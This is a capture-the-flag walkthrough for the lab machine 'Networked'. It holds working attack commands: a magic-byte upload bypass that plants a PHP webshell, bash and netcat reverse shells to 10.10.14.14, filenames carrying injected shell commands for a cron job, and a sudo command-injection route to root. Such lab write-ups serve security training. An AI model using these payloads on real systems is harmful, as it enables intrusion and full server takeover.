# Networked

Info
* OS: Linux
* Difficulty: easy
* IP: `10.10.10.146`

Tags
* php
* magic bytes
* webshell

<!--

Required tools
* nmap
* gobuster
* linpeas

Other commands/tools
```
exiftool
file
```

-->

## Walkthrough

* [IppSec](http://youtube.com/watch?v=H3t3G70bakM) (video)

### Enumeration

Nmap
```bash
nmap -n -Pn -sC -sV -p- --min-rate 1000 -oA nmap.out -v 10.10.10.146

# output
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
```

Gobuster
```bash
exa -l --sort=size --reverse /git-repos/wordlists/SecLists/Discovery/Web-Content/ | head -n 20

# php extension: see "http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16"
gobuster dir \
  -u http://10.10.10.146 \
  -w /git-repos/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -t 100 \
  -x php \
  -o gobuster.out

# output
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.146
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /git-repos/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/04/26 07:44:41 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 229]
/uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
/photos.php           (Status: 200) [Size: 1302]
/upload.php           (Status: 200) [Size: 169]
/lib.php              (Status: 200) [Size: 0]
/backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/]
```

Examine `/backup` path
```bash
# firefox and curl override "File Modification Date/Time"
wget -O backup.tar http://10.10.10.146/backup/backup.tar

exiftool backup.tar
# output
ExifTool Version Number         : 12.16
File Name                       : backup.tar
Directory                       : .
File Size                       : 10 KiB
File Modification Date/Time     : 2019:07:09 11:33:42+00:00
File Access Date/Time           : 2023:04:28 07:10:27+00:00
File Inode Change Date/Time     : 2023:04:28 07:10:27+00:00
File Permissions                : rw-r--r--
File Type                       : TAR
File Type Extension             : tar
MIME Type                       : application/x-tar
Warning                         : Unsupported file type

# list content
tar -tvf backup.tar
-rw-r--r-- root/root       229 2019-07-09 11:33 index.php
-rw-r--r-- root/root      2001 2019-07-02 11:38 lib.php
-rw-r--r-- root/root      1871 2019-07-02 12:53 photos.php
-rw-r--r-- root/root      1331 2019-07-02 12:45 upload.php

# extract content
mkdir -p backup && tar -xvf backup.tar -C backup && cd $_
```

Examine PHP files and verify image upload

* [superglobals](https://www.php.net/manual/en/language.variables.superglobals.php)
* [filesize](https://www.php.net/manual/en/function.filesize.php)

```bash
# look for input params
grep -Ri '$_' *.php
# output
lib.php:<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
photos.php:  if ((strpos($exploded[0], '10_10_') === 0) && (!($prefix === $_SERVER["REMOTE_ADDR"])) ) {
upload.php:if( isset($_POST['submit']) ) {
upload.php:  if (!empty($_FILES["myFile"])) {
upload.php:    $myFile = $_FILES["myFile"];
upload.php:    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
upload.php:    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
upload.php:    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

# lib.php: upload form
<form action="/upload.php" method="post" enctype="multipart/form-data">
  <input type="file" name="myFile">
  <br>
  <input type="submit" name="submit" value="go!">
</form>

# upload.php: filesize($_FILES['myFile']['tmp_name']) < 60000)
# filesize returns the size of the file in bytes
# 1 KB == 1024 bytes
bc
60000 / 1024
58

# random image
curl -sSL -o random.jpg https://picsum.photos/200
# terminal viewer
viu random.jpg
# upload manually
http -f POST 10.10.10.146/upload.php submit='go!' myFile@random.jpg
# verify gallery
curl -sS http://10.10.10.146/photos.php | pup 'table td img attr{src}'
# output
uploads/10_10_14_14.jpg
uploads/127_0_0_4.png
uploads/127_0_0_3.png
uploads/127_0_0_2.png
uploads/127_0_0_1.png
```

Investigate magic bytes and file types

* [PHP finfo_file](https://www.php.net/manual/en/function.finfo-file.php)
* [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
* [Magic Bytes - Identifying Common File Formats at a Glance](https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance)
* [What is a Magic Byte and how to exploit](https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198)

```bash
# upload.php: check_file_type($_FILES["myFile"]
# lib.php: @finfo_file / @mime_content_type
# lib.php: if (strpos($mime_type, 'image/') === 0)
# upload.php: $validext = array('.jpg', '.png', '.gif', '.jpeg');

file -i random.jpg 
#random.jpg: image/jpeg; charset=binary

file random.jpg 
#random.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=6, orientation=upper-left, xresolution=86, yresolution=94, resolutionunit=2], progressive, precision 8, 200x200, components 3

xxd random.jpg | head
#00000000: ffd8 ffe1 00de 4578 6966 0000 4949 2a00  ......Exif..II*.

# example executable
ELF Executable
".ELF"
0x7F 0x45 0x4C 0x46

# craft ELF
python3 -c 'print("\x7F\x45\x4C\x46")' > test-elf.txt
# verify
file test-elf.txt 
#test-elf.txt: ELF
xxd test-elf.txt 
#00000000: 7f45 4c46 0a                             .ELF.

# example image
GIF Image
"GIF87a"
0x47 0x49 0x46 0x38 0x37 0x61

# craft image
echo -n -e 'GIF87a' > test-gif.txt
# verify
file test-gif.txt 
#test-gif.txt: GIF image data, version 87a,
xxd test-gif.txt 
#00000000: 4749 4638 3761                           GIF87a
```

Circumvent file type protection and upload PHP webshell
```bash
echo -n -e 'GIF87a <?php print("Hello World"); ?>' > test.php.gif

# verify
file test.php.gif 
#test.php.gif: GIF image data, version 87a, 15392 x 28735

# upload
http -f POST 10.10.10.146/upload.php submit='go!' myFile@test.php.gif

# verify (name is ip address of request)
curl -sS http://10.10.10.146/uploads/10_10_14_14.php.gif

# webshell
echo -n -e 'GIF87a <?php system($_GET['cmd']); ?>' > webshell.php.gif
echo -n -e 'GIF87a <?php system($_REQUEST['cmd']); ?>' > webshell.php.gif

# upload
http -f POST 10.10.10.146/upload.php submit='go!' myFile@webshell.php.gif
# list
http http://10.10.10.146/photos.php | pup 'table td img attr{src}'
# request
http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=whoami
# GIF87a apache
http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=id
# GIF87a uid=48(apache) gid=48(apache) groups=48(apache)

# url encode payload
jq --raw-output --null-input --arg VALUE "bash -i >& /dev/tcp/10.10.14.14/4242 0>&1" '$VALUE|@uri'
#bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F4242%200%3E%261
urlencode "bash -i >& /dev/tcp/10.10.14.14/4242 0>&1"
#bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.14%2F4242+0%3E%261

# listen
nc -lvnp 4242
# rlwrap removes line wraps i.e. truncated lines when C&P in the shell
rlwrap nc -lvnp 4242
# open reverse shell
http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F4242%200%3E%261
http 10.10.10.146/uploads/10_10_14_14.php.gif?cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.14%2F4242+0%3E%261
```

Upgrade shell

* [Pimp My Shell](https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2)
* [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys)
* [Upgrade a linux reverse shell to a fully usable TTY shell](https://zweilosec.github.io/posts/upgrade-linux-shell) (see `rlwrap`)

```bash
# run inside reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'

# send in background
CTRL+Z

# run from host (attacking machine)
stty raw -echo

# type (not shown)
fg
# press enter twice and it will propmt the shell back
ENTER
ENTER

# to be able to run "clear"
export TERM=xterm
```

### Lateral Movement

Explore user folders
```bash
# home path
cd /home/guly

# leverage cron to privesc
cat crontab.guly 
*/3 * * * * php /home/guly/check_attack.php

# -w: disable line wrapping
base64 -w 0 /home/guly/check_attack.php; echo
# copy locally for investigation
PD9waHAKcmVxdWlyZSAnL3Zhci93d3cvaHRtbC9saWIucGhwJzsKJHBhdGggPSAnL3Zhci93d3cvaHRtbC91cGxvYWRzLyc7CiRsb2dwYXRoID0gJy90bXAvYXR0YWNrLmxvZyc7CiR0byA9ICdndWx5JzsKJG1zZz0gJyc7CiRoZWFkZXJzID0gIlgtTWFpbGVyOiBjaGVja19hdHRhY2sucGhwXHJcbiI7CgokZmlsZXMgPSBhcnJheSgpOwokZmlsZXMgPSBwcmVnX2dyZXAoJy9eKFteLl0pLycsIHNjYW5kaXIoJHBhdGgpKTsKCmZvcmVhY2ggKCRmaWxlcyBhcyAka2V5ID0+ICR2YWx1ZSkgewoJJG1zZz0nJzsKICBpZiAoJHZhbHVlID09ICdpbmRleC5odG1sJykgewoJY29udGludWU7CiAgfQogICNlY2hvICItLS0tLS0tLS0tLS0tXG4iOwoKICAjcHJpbnQgImNoZWNrOiAkdmFsdWVcbiI7CiAgbGlzdCAoJG5hbWUsJGV4dCkgPSBnZXRuYW1lQ2hlY2soJHZhbHVlKTsKICAkY2hlY2sgPSBjaGVja19pcCgkbmFtZSwkdmFsdWUpOwoKICBpZiAoISgkY2hlY2tbMF0pKSB7CiAgICBlY2hvICJhdHRhY2shXG4iOwogICAgIyB0b2RvOiBhdHRhY2ggZmlsZQogICAgZmlsZV9wdXRfY29udGVudHMoJGxvZ3BhdGgsICRtc2csIEZJTEVfQVBQRU5EIHwgTE9DS19FWCk7CgogICAgZXhlYygicm0gLWYgJGxvZ3BhdGgiKTsKICAgIGV4ZWMoIm5vaHVwIC9iaW4vcm0gLWYgJHBhdGgkdmFsdWUgPiAvZGV2L251bGwgMj4mMSAmIik7CiAgICBlY2hvICJybSAtZiAkcGF0aCR2YWx1ZVxuIjsKICAgIG1haWwoJHRvLCAkbXNnLCAkbXNnLCAkaGVhZGVycywgIi1GJHZhbHVlIik7CiAgfQp9Cgo/Pgo=
# output locally
echo "<BASE64_VALUE>" | base64 -d > check_attack.php
# line 29: control $value - filename '/var/www/html/uploads/'
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");

# avoid reusing netcat on the same PORT: once the connection is open sometimes it won't listen anymore
# replacement for netstat
ss -lnp | grep 4242

# test connection: ALWAYS use v (verbose) to se a prompt when it connects
# listen from attacking machine
nc -lvnp 4444
# exec in "apache" shell
nc -c bash 10.10.14.14 4444

# create malicious filename without slashes
cd /var/www/html/uploads/

# -- means no arguments
touch -- ';nc -c bash 10.10.14.14 4242;.php'

# alternative
touch "; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.14:4242"

# alternative (to verify)
echo -n 'bash -c "bash -i >/dev/tcp/10.10.14.14:4242 0>&1"' | base64
# YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMTQ6NDI0MiAwPiYxIg==
touch ';echo YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMTQ6NDI0MiAwPiYxIg== | base64 -d | bash'

# alternative (to verify)
base64py "bash -i >/dev/tcp/10.10.14.14:4242 0>&1"
# b'YmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMTQ6NDI0MiAwPiYx'
touch ';echo YmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMTQ6NDI0MiAwPiYx | base64 -d | bash'

# wait for the cronjob to run every 3 mins
date
nc -lvnp 4242
socat file:`tty`,raw,echo=0 tcp-listen:4242

# flag
cat /home/guly/user.txt
```

### Privilege Escalation

Equivalent to linPEAS
```bash
# list executable commands with sudo privilege
sudo -l
Matching Defaults entries for guly on networked:
  !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
  env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
  env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
  env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
  env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
  env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
  secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
  (root) NOPASSWD: /usr/local/sbin/changename.sh
```

Exploit known RCE vulnerability via command injection

* [Redhat/CentOS root through network-scripts](https://seclists.org/fulldisclosure/2019/Apr/24)

```bash
# leverage code execution with spaces
TEST=x whoami

# see
/usr/local/sbin/changename.sh
/etc/sysconfig/network-scripts/ifcfg-guly

# add SPACE + COMMAND as input to any variable
NAME=hello sh

# get root access
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
hello bash
interface PROXY_METHOD:
aaa
interface BROWSER_ONLY:
bbb
interface BOOTPROTO:
ccc
[root@networked network-scripts]#

# alternative, change password
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
aaa passwd

# login with new password
su

# flag
cat /root/root.txt
```
